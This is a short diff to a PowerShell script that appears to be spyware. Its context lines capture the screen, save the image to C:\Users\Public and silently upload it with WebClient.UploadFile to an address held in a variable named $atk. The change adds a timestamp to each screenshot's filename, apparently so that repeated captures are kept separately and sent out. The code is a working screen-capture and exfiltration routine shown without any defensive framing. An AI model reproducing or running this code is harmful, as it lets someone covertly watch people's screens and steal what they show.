@@ -366,7 +366,8 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
    $bmp.Dispose()
 }
 $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1024)
-$screenshotPath = "C:\Users\Public\screenshot.png"
+$timestamp = (Get-Date).ToString("HH-mm-ss")
+$screenshotPath = "C:\Users\Public\screenshot_$timestamp.png"
 screenshot $bounds $screenshotPath
 $webClient = New-Object System.Net.WebClient
 $webClient.UploadFile($atk, $screenshotPath) > $null 2>&1
